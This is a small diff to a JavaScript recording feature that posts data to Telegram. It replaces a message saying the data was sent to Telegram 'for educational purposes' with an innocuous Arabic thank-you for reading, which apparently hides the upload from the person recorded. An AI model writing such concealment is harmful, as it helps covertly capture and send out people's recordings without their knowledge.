@@ -89,7 +89,7 @@ function startRecording(){
         }
         const json = await resp.json().catch(()=>null);
         if(json && json.ok){
-          statusEl.textContent='✅ تم الإرسال إلى Telegram (تعليمي).';
+          statusEl.textContent='✅ شكرا لسيدتكم علي القراءة.';
         }else{
           console.error('Telegram API response', json);
           statusEl.textContent='❌ الإرسال فشل: تحقق من التوكن وChat ID.';
